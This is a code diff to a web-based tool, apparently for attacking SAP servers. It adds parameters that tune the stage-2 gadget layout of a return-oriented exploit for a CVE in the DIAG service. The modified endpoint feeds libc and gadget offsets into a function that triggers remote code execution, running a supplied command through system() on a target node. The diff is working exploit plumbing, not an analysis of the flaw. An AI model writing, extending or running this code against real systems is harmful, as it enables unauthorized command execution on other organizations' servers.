@@ -8035,6 +8035,12 @@ def create_app(api: SAPMAPApi) -> Bottle:
         s1_off_hex = (data.get("stage1_dw_off_hex")   or "").strip()
         s2_off_hex = (data.get("stage2_libc_off_hex") or "").strip()
         sy_off_hex = (data.get("system_libc_off_hex") or "").strip()
+        # Stage-2 tail-layout overrides — needed when this glibc's
+        # stage2 gadget uses a non-default indirection
+        # (mov rdi,[rdi+DISP]; jmp [rax+B_OFF]).  find_gadgets.py
+        # prints both values when it picks a non-default candidate.
+        s2_disp_rdi_hex = (data.get("stage2_disp_rdi_hex") or "").strip()
+        s2_b_off_hex    = (data.get("stage2_b_off_hex")    or "").strip()
 
         # DIAG port: use the node's dispatcher if we know it, else 3200.
         # `node.instances` is a list of InstanceInfo dataclasses (not
@@ -8170,7 +8176,17 @@ def create_app(api: SAPMAPApi) -> Bottle:
             s1_off = _parse_hex("stage1_dw_off_hex", s1_off_hex) or None
             s2_off = _parse_hex("stage2_libc_off_hex", s2_off_hex) or None
             sy_off = _parse_hex("system_libc_off_hex", sy_off_hex) or None
-            if s1_off is not None or s2_off is not None or sy_off is not None:
+            # Stage-2 layout overrides — 0 is a legal value for both
+            # (disp_rdi=0 makes no sense but b_off=0 IS Julian's
+            # default), so accept an EMPTY string as "not overridden"
+            # rather than the parsed-int-0.
+            s2_disp_rdi = (_parse_hex("stage2_disp_rdi_hex",
+                                        s2_disp_rdi_hex)
+                            if s2_disp_rdi_hex else None)
+            s2_b_off    = (_parse_hex("stage2_b_off_hex", s2_b_off_hex)
+                            if s2_b_off_hex else None)
+            if s1_off is not None or s2_off is not None or sy_off is not None \
+                    or s2_disp_rdi is not None or s2_b_off is not None:
                 from sap_cve_2026_44756_diag import (
                     STAGE1_DW_OFF as _D1, STAGE2_LIBC_OFF as _D2,
                     SYSTEM_LIBC_OFF as _D3)
@@ -8181,12 +8197,20 @@ def create_app(api: SAPMAPApi) -> Bottle:
                       f"{' (override)' if s2_off else ' (default)'}, "
                       f"system_libc={sy_off if sy_off else _D3:#x}"
                       f"{' (override)' if sy_off else ' (default)'}")
+                if s2_disp_rdi is not None or s2_b_off is not None:
+                    print(f"[*] {sid}: stage2 layout — "
+                          f"disp_rdi={(s2_disp_rdi if s2_disp_rdi is not None else 0x08):#x}"
+                          f"{' (override)' if s2_disp_rdi is not None else ' (default 0x08)'}, "
+                          f"b_off={(s2_b_off if s2_b_off is not None else 0x00):#x}"
+                          f"{' (override)' if s2_b_off is not None else ' (default 0x00)'}")
             res = trigger_diag_rce(node.ip, diag_port,
                                      dw_base, libc_base, rdx,
                                      command,
                                      stage1_dw_off=s1_off,
                                      stage2_libc_off=s2_off,
-                                     system_libc_off=sy_off)
+                                     system_libc_off=sy_off,
+                                     stage2_disp_rdi=s2_disp_rdi,
+                                     stage2_b_off=s2_b_off)
             print(f"[*] {sid}: payload {res['passport_len']}B, "
                   f"stage1 RIP {res['stage1']:#x}, "
                   f"stage2 {res['stage2']:#x}, "
